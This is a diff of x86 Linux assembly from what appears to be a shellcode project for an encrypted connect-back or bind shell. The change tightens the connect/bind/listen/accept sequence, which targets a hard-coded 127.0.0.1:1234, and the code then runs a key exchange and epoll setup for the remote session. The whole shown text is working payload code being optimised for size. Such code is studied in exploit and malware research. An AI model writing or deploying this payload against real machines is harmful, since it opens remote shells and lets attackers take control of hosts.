@@ -222,55 +222,51 @@ opn_con:
       push   2                 ; family   = AF_INET
       mov    ecx, esp          ; ecx      = &args      
       int    0x80 
-      stosd                    ; save socket
-
-%ifndef BIND
-      push   0x0100007f  ; sa.sin_addr=127.0.0.1
-      push   0xD2040002  ; sa.sin_port=htons(1234)
-                         ; sa.sin_family=AF_INET
-      mov    ecx, esp    ; ecx = &sa
       
-      ; connect (s, &sa, sizeof(sa));    
+      push   0x0100007f        ; sa.sin_addr=127.0.0.1
+      push   0xD2040002        ; sa.sin_port=htons(1234)
+                               ; sa.sin_family=AF_INET
+      mov    ecx, esp          ; ecx = &sa
+      
       push   16                ; sizeof(sa)      
       push   ecx               ; &sa
       push   eax               ; s
-      mov    ecx, esp          ; &args      
-      push   SYS_CONNECT
-      pop    ebx               ; ebx = SYS_CONNECT
+      mov    ecx, esp          ; &args       
+%ifndef BIND
+      stosd                    ; save socket  
       push   SYS_socketcall
       pop    eax
+      ; connect (s, &sa, sizeof(sa)); 
+      push   SYS_CONNECT
+      pop    ebx               ; ebx = SYS_CONNECT
       int    0x80      
 %else
-      pop    ebx               ; ebx=2, SYS_BIND
-      pop    esi               ; esi=1
-      push   0x10              ; sizeof(sa)
-      push   ebp               ; &sa
-      push   edi               ; s
-      mov    ecx, esp          ; ecx=&args      
-      mov    al, SYS_socketcall
+      push   SYS_socketcall
+      pop    eax
+      ; bind (s, &sa, sizeof(sa));
+      inc    ebx               ; ebx = SYS_BIND     
       int    0x80
 
-      mov    [ecx+4], edx      ; clear sa from args
+      mov    [ecx+4], eax      ; clear sa from args
 
-      ; listen for incoming connections
       ; listen (s, 0);
       mov    al, SYS_socketcall
-      mov    bl, SYS_listen
+      add    ebx, ebx          ; ebx = SYS_LISTEN
       int    0x80
 
-      ; accept connections
       ; accept (s, 0, 0);
       mov    al, SYS_socketcall
-      inc    ebx               ; ebx=sys_accept
+      inc    ebx               ; ebx = SYS_ACCEPT
       int    0x80
-%endif
-      
+      stosd                    ; save socket
+%endif      
       ; attempt to secure the connection
       call   key_xchg
       jle    cls_sck  
       
       ; efd = epoll_create1(0);
-      mov    eax, SYS_epoll_create1
+      mov    al, SYS_epoll_create1 & 0xFF
+      mov    ah, SYS_epoll_create1 >> 8
       xor    ebx, ebx          ; sets CF=0
       int    0x80
       stosd                    ; save efd
